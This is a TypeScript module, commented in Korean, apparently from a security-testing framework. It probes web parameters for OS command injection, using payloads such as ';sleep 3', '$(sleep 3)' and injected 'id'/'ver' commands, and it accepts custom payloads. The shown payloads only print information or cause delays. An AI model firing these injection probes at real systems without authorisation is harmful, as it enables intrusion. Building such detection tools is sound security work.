/**
 * cmdi_probe — OS 커맨드 인젝션 탐지 + 최소 PoC.
 *
 * 파라미터에 여러 구분자(; | && `` $() 등)로 무해한 정보성 명령(`id`/`whoami`/`ver`)을
 * 붙여, 응답에 그 명령의 "출력 시그니처"가 나타나는지 본다.
 *   - `uid=NN(...) gid=NN(...)`  → high (Unix 명령 실행)
 *   - `Microsoft Windows [Version` → high (Windows 명령 실행)
 * 오직 정보 출력 명령만 쓴다(파괴/네트워크/파일변경 없음). PayloadForge 로 스택별 변형.
 */

import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { forge } from "../core/payload-forge.js";
import { authGet, baseUrl, joinPath, withQuery } from "./util.js";

const UNIX_OUT = /uid=\d+\([^)]*\)\s+gid=\d+\(/; // `id` 출력
const WIN_OUT = /Microsoft Windows \[Version|Windows IP Configuration/i; // `ver`/`ipconfig`
const DEFAULT_PARAMS = ["cmd", "exec", "command", "host", "ip", "ping", "domain", "q", "name", "file", "dns", "target"];
const DEFAULT_PATHS = ["/"];
const MAX_PARAMS = 5;
const MAX_PATHS = 8;
const MAX_PAYLOADS = 8;

// 시간 기반 블라인드: 명령 출력을 응답에 되돌리지 않는(blind) 대상용 최후 수단.
// 조건부 지연(sleep)이 실제로 실행되는지 응답 시간으로 확인한다(무해 — 지연만).
const CMDI_SLEEP = 3;
const TIME_PAYLOADS = [
  `;sleep ${CMDI_SLEEP}`,
  `|sleep ${CMDI_SLEEP}`,
  `&&sleep ${CMDI_SLEEP}`,
  `\`sleep ${CMDI_SLEEP}\``,
  `$(sleep ${CMDI_SLEEP})`,
  `& ping -n ${CMDI_SLEEP + 1} 127.0.0.1`, // Windows: 지연 대용
];
const MAX_TIME_PAYLOADS = 4;

export const cmdiProbe: Tool = {
  name: "cmdi_probe",
  description:
    "파라미터에 여러 구분자로 무해한 정보 명령(id/whoami/ver)을 주입해 OS 커맨드 인젝션을 탐지한다. 명령 출력 시그니처 노출 시 high. args.payloads 로 커스텀 주입.",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const paths = pickPaths(args);
    const params = pickParams(args);
    const payloads = pickPayloads(args);

    // 1) 출력 기반: 주입 명령의 출력 시그니처가 응답에 나타나는가(가장 확실).
    for (const path of paths) {
      for (const param of params) {
        for (const payload of payloads) {
          const url = joinPath(base, withQuery(path, { [param]: `1${payload}` }));
          try {
            const res = await authGet(ctx, url);
            const kind = UNIX_OUT.test(res.body) ? "unix `id`" : WIN_OUT.test(res.body) ? "windows `ver`" : null;
            if (kind) {
              return {
                ok: true,
                summary: `OS 커맨드 인젝션 확인: ${path} 의 param '${param}' 로 ${kind} 실행`,
                fingerprint: { indicators: [`cmdi ${path}?${param}`, kind] },
                data: {
                  // OS 명령 실행 = 원격 코드 실행 → critical.
                  severity: "critical",
                  title: `OS Command Injection (param=${param})`,
                  evidence: `주입 명령 출력 노출 (path=${path}, payload=${payload}): ${firstLine(res.body)}`,
                  param,
                  impact: "임의 OS 명령을 서버 권한으로 실행 가능 → 데이터 탈취·측면 이동·서버 완전 장악(RCE).",
                },
              };
            }
          } catch {
            /* 개별 실패 무시 */
          }
        }
      }
    }

    // 2) 시간 기반 블라인드: 출력을 안 되돌리는 대상용. 조건부 지연이 실제로 실행되는지 측정.
    // 오탐 방지: 기준 응답을 먼저 재고, 지연 페이로드가 (CMDI_SLEEP-0.5)s 이상 더 걸릴 때만 신호.
    const timePayloads = TIME_PAYLOADS.slice(0, MAX_TIME_PAYLOADS);
    for (const path of paths) {
      for (const param of params) {
        try {
          const baseMs = await elapsed(() => authGet(ctx, joinPath(base, withQuery(path, { [param]: "1" }))));
          for (const payload of timePayloads) {
            const url = joinPath(base, withQuery(path, { [param]: `1${payload}` }));
            const ms = await elapsed(() => authGet(ctx, url));
            if (ms - baseMs >= (CMDI_SLEEP - 0.5) * 1000) {
              // 재확인: 우연한 지연 배제를 위해 한 번 더 측정.
              const confirm = await elapsed(() => authGet(ctx, url));
              if (confirm - baseMs >= (CMDI_SLEEP - 0.5) * 1000) {
                return {
                  ok: true,
                  summary: `OS 커맨드 인젝션 확인(시간 기반 블라인드): ${path} 의 param '${param}' 조건부 지연 실행`,
                  fingerprint: { indicators: [`cmdi ${path}?${param}`, "time-based blind"] },
                  data: {
                    severity: "critical",
                    title: `OS Command Injection (time-based blind, param=${param})`,
                    evidence: `지연 페이로드(${payload})에서 응답 +${Math.round(ms - baseMs)}ms (기준 ${Math.round(baseMs)}ms) — 출력은 없으나 명령이 실행됨`,
                    param,
                    impact: "출력을 되돌리지 않아도 명령이 실행된다 → 블라인드 RCE. 데이터 유출·서버 장악으로 확대.",
                  },
                };
              }
            }
          }
        } catch {
          /* 개별 실패 무시 */
        }
      }
    }
    return { ok: false, summary: `커맨드 인젝션 미탐지 (paths=${paths.join(",")}, params=${params.join(",")}, 출력+시간 2갈래)` };
  },
};

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PATHS);
  }
  return DEFAULT_PATHS;
}

function pickParams(args: Record<string, unknown>): string[] {
  if (typeof args.param === "string" && args.param) return [args.param];
  if (Array.isArray(args.params)) {
    const ps = args.params.filter((x): x is string => typeof x === "string");
    if (ps.length) return ps.slice(0, MAX_PARAMS);
  }
  return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
}

function pickPayloads(args: Record<string, unknown>): string[] {
  if (Array.isArray(args.payloads)) {
    const ps = args.payloads.filter((x): x is string => typeof x === "string");
    if (ps.length) return ps.slice(0, MAX_PAYLOADS);
  }
  return forge("cmdi").slice(0, MAX_PAYLOADS);
}

function firstLine(body: string): string {
  return (body.split("\n").find((l) => UNIX_OUT.test(l) || WIN_OUT.test(l)) ?? body.slice(0, 60)).trim().slice(0, 80);
}

/** 콜백 실행에 걸린 시간(ms). 시간 기반 블라인드 측정용. */
async function elapsed(fn: () => Promise<unknown>): Promise<number> {
  const t0 = Date.now();
  await fn();
  return Date.now() - t0;
}
